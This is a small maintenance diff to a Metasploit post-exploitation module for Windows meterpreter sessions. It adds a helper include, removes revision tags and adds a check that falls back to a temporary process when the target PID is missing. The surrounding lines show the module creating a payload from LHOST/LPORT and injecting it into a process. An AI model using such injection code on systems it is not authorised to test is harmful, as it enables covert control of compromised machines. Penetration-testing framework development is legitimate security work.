@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # ## This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -11,8 +7,11 @@
 
 require 'msf/core'
 require 'rex'
+require 'msf/core/post/common'
 
 class Metasploit3 < Msf::Post
+
+	include Msf::Post::Common
 
 	def initialize(info={})
 		super( update_info( info,
@@ -24,7 +23,6 @@ class Metasploit3 < Msf::Post
 			},
 			'License'       => MSF_LICENSE,
 			'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
-			'Version'       => '$Revision$',
 			'Platform'      => [ 'win' ],
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
@@ -67,7 +65,7 @@ class Metasploit3 < Msf::Post
 		opts     = datastore['OPTIONS']
 		# Create payload
 		payload = create_payload(pay_name,lhost,lport,opts)
-		if pid == 0
+		if pid == 0 or not has_pid?(pid)
 			pid = create_temp_proc(payload)
 		end
 		if payload.arch.join =~ /64/ and client.platform =~ /x86/
